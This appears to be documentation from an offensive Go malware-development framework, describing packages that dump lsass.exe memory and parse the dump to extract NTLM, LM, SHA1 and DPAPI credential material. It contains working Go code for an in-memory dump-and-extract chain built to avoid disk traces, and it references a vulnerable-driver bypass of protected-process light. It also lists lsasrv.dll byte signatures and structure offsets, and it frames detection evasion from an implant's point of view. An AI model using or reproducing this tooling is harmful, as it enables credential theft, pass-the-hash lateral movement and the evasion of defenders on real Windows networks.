[← Back to README](../README.md)

# Credentials — LSASS dump + parse

The `credentials/` tree is split into a **producer** + **consumer** pair:

| Package | Role | Platform | Touches |
|---|---|---|---|
| `credentials/lsassdump` | **Producer** — captures lsass.exe memory into a MINIDUMP blob | Windows | `NtOpenProcess` + `NtReadVirtualMemory` against lsass; optionally a `kernel/driver.ReadWriter` for PPL bypass |
| `credentials/lsasparse` | **Consumer** — parses a MINIDUMP, decrypts the MSV1_0 logon-session list, surfaces NTLM hashes | cross-platform (pure Go) | nothing — no Win32 calls; an analyst Linux box can parse a Windows dump |

Pair them in-process for "dump → extract → wipe" with no on-disk
persistence:

```go
import (
    "bytes"
    "github.com/oioio-space/maldev/credentials/lsassdump"
    "github.com/oioio-space/maldev/credentials/lsasparse"
)

// 1. Dump.
h, _ := lsassdump.OpenLSASS(nil)
defer lsassdump.CloseLSASS(h)
var buf bytes.Buffer
if _, err := lsassdump.Dump(h, &buf, nil); err != nil { panic(err) }

// 2. Parse the bytes still in memory — no disk write.
result, err := lsasparse.Parse(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
if err != nil { /* errors.Is(err, lsasparse.ErrUnsupportedBuild) → register a template */ }
defer result.Wipe()

// 3. Use the credentials.
for _, s := range result.Sessions {
    for _, c := range s.Credentials {
        if msv, ok := c.(lsasparse.MSV1_0Credential); ok {
            fmt.Println(msv.String()) // pwdump format ready for pth tools
        }
    }
}
```

For the Win11 + RunAsPPL=1 case where lsass refuses VM_READ, layer
`credentials/lsassdump.Unprotect` (driver-assisted PPL bypass — see
[lsass-dump.md](techniques/collection/lsass-dump.md)) before the
`OpenLSASS` call. Same `kernel/driver.ReadWriter` (RTCore64, GDRV,
custom) plugs into both the Unprotect path and `evasion/kcallback`'s
Remove path.

---

## `credentials/lsassdump`

See [`docs/techniques/collection/lsass-dump.md`](techniques/collection/lsass-dump.md).

Producer surface:

- `OpenLSASS(*wsyscall.Caller) (uintptr, error)` — `NtGetNextProcess` walk + targeted `NtOpenProcess(VM_READ)`.
- `Dump(handle, w io.Writer, *wsyscall.Caller) (Stats, error)` — streams a MINIDUMP to `w` without an in-memory copy of the regions.
- `DumpToFile(path, *wsyscall.Caller) (Stats, error)` — convenience wrapper.
- `Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLToken, error)` + `Reprotect(tok, rw)` — EPROCESS-byte unprotect for PPL bypass.

The MINIDUMP layout matches `MiniDumpWriteDump(MiniDumpWithFullMemory)`,
making `lsassdump`'s output directly compatible with mimikatz's
`!sekurlsa::minidump` and pypykatz's `pypykatz lsa minidump`.

---

## `credentials/lsasparse`

The consumer is **complete with inline default Templates** at
v0.23.2: the MINIDUMP reader, LSA crypto layer, MSV1_0 walker,
`Parse(reader, size)` public entry-point, and built-in Win10/Win11
templates all ship and round-trip end-to-end against synthetic
fixtures. A dump from one of the documented builds parses **without
any operator setup**.

Templates that ship inline (registered automatically via `init()`):

| Build range | Coverage |
|---|---|
| 18362 – 19045 | Win10 19H1 (1903) → Win10 22H2 |
| 22000 – 22621 | Win11 21H2 → Win11 22H2 (pre-22622) |

Builds outside those ranges (Win10 1809 / 1607 / RTM, Win11 22622+ /
23H2 / 24H2, Server 2019 / 2022 / 2025) return `ErrUnsupportedBuild`
from Parse. For those, operators call `RegisterTemplate(...)` at
init time with the per-build offsets — see [Registering a
Template](#registering-a-template) below. Adding a build means
walking lsasrv.dll for that LCU with IDA/Ghidra, locating the
global-load instruction sequence, and recording the surrounding
byte pattern + rel32 offsets.

**Canonical references** for the byte patterns + offsets:

- [`pypykatz`](https://github.com/skelsec/pypykatz) (GPL-3) —
  `pypykatz/lsadecryptor/lsa_template_nt6.py` for the LSA
  IV/3DES/AES patterns; `pypykatz/lsadecryptor/packages/msv/templates.py`
  for the MSV1_0 LogonSessionList signature + per-build node
  layouts (`KIWI_MSV1_0_LIST_62/63/64/65`).
- [`mimikatz`](https://github.com/gentilkiwi/mimikatz) (CC-NC) —
  `mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_*.c` for the same
  patterns from the original research source.

Licensing: pypykatz is GPL-3, mimikatz is CC-BY-NC-SA. We don't
redistribute their code. Byte patterns extracted from public
Microsoft binaries are factual observations, not copyrightable in
themselves — every credential-extraction tool reuses them because
they're empirical. Operators register templates via
`RegisterTemplate(t)` at init time; the byte values stay in
operator hands, the framework stays in the repo.

For the v0.23.x Win10/Win11 baseline, the published values are:

| Region | Signature (lsasrv.dll) | IV off | 3DES off | AES off |
|---|---|---|---|---|
| Win10 1809–22H2 / Win11 21H2–22H2 (build 17763–22621) | `83 64 24 30 00 48 8D 45 E0 44 8B 4D D8 48 8D 15` | +0x43 | -0x59 | +0x10 |
| Win11 23H2 (22631) | (different signature — see references) | | | |

| MSV signature (lsasrv.dll) | first_entry | bucket_count |
|---|---|---|
| Win10 1903 – Win11 22621 | `33 FF 41 89 37 4C 8B F3 45 85 C0 74` | +23 | -4 |
| Win11 22622 – 22631 | `45 89 34 24 4C 8B FF 8B F3 45 85 C0 74` | +24 | -4 |

The `KIWI_MSV1_0_LIST_63` node layout (Win10 22H2) computes to:
LUID=0x70, UserName=0x90, Domain=0xA0, LogonServer=0xF8,
LogonType=0xD8, LogonTime=0xF0, SID=0xD0, Credentials=0x108,
NodeSize≥0x180.

### Surface

```go
// Parse extracts credentials from a MINIDUMP blob.
func Parse(reader io.ReaderAt, size int64) (*Result, error)
func ParseFile(path string) (*Result, error)

// Result. BuildNumber + Architecture + Modules populate even when
// no template covers the build, so callers can detect support.
type Result struct {
    BuildNumber  uint32
    Architecture Architecture
    Modules      []Module
    Sessions     []LogonSession
    Warnings     []string
}
func (r *Result) ModuleByName(name string) (Module, bool)
func (r *Result) Wipe()

// Credentials. v1 ships exactly one variant; future Wdigest /
// Kerberos / TSPkg variants implement the same interface.
type Credential interface {
    AuthPackage() string
}
type MSV1_0Credential struct {
    UserName    string
    LogonDomain string
    NTHash      [16]byte
    LMHash      [16]byte
    SHA1Hash    [20]byte
    DPAPIKey    [16]byte
    Found       bool
}
func (MSV1_0Credential) AuthPackage() string  // → "MSV1_0"
func (MSV1_0Credential) String() string       // → pwdump format

// Per-build templates. Operators register their own at init when
// the dump's BuildNumber doesn't match a built-in.
type Template struct {
    BuildMin, BuildMax uint32
    IVPattern          []byte
    IVWildcards        []int
    IVOffset           int32
    Key3DESPattern     []byte
    Key3DESWildcards   []int
    Key3DESOffset      int32
    KeyAESPattern      []byte
    KeyAESWildcards    []int
    KeyAESOffset       int32
    LogonSessionListPattern   []byte
    LogonSessionListWildcards []int
    LogonSessionListOffset    int32
    LogonSessionListCount     int
    MSVLayout                 MSVLayout
}
func RegisterTemplate(*Template) error

// Sentinels.
var (
    ErrNotMinidump        // input not MDMP
    ErrUnsupportedBuild   // no Template covers SystemInfo.BuildNumber
    ErrLSASRVNotFound     // lsasrv.dll missing from MODULE_LIST
    ErrMSV1_0NotFound     // msv1_0.dll missing from MODULE_LIST
    ErrKeyExtractFailed   // pattern matched but BCRYPT blob malformed
)
```

### Registering a Template

```go
import "github.com/oioio-space/maldev/credentials/lsasparse"

func init() {
    _ = lsasparse.RegisterTemplate(&lsasparse.Template{
        BuildMin: 19045, BuildMax: 19045, // Win10 22H2
        IVPattern:      []byte{ /* … 12-byte signature near the IV load instruction … */ },
        IVWildcards:    []int{ /* per-CU drift positions */ },
        IVOffset:       63, // signed bytes from match start to the rel32
        Key3DESPattern: []byte{ /* … */ },
        Key3DESOffset:  -89,
        KeyAESPattern:  []byte{ /* … */ },
        KeyAESOffset:   16,
        LogonSessionListPattern: []byte{ /* … */ },
        LogonSessionListOffset:  23,
        LogonSessionListCount:   32, // Win10 has 32 buckets
        MSVLayout: lsasparse.MSVLayout{
            NodeSize:          0x100,
            LUIDOffset:        0x10,
            UserNameOffset:    0x90,
            LogonDomainOffset: 0xA0,
            LogonServerOffset: 0xB0,
            LogonTypeOffset:   0xC8,
            CredentialsOffset: 0xD8,
        },
    })
}
```

### Detection

**Low**. `lsasparse.Parse` runs entirely in the implant's own
address space with pure-Go primitives — no Win32 calls, no
filesystem access, no further detection surface. The loud
operations are the dump itself (covered in
[lsass-dump.md](techniques/collection/lsass-dump.md)) and any
optional driver-assisted PPL bypass.

### Limitations

- v1 ships MSV1_0 only. WDigest plaintexts, Kerberos tickets, DPAPI
  master keys, and the LiveSSP / TSPkg / CloudAP secrets are each
  separate ~300-500 LOC follow-ups on top of the v1 crypto layer.
- x64 only. The `Architecture` enum reserves `ArchX86` for a future
  WoW64 variant.
- Credential Guard / LSAISO trustlet sessions surface as warnings —
  the dump contains the wrappers but the secrets are kernel-isolated
  ciphertext we can't decrypt without a separate primitive.
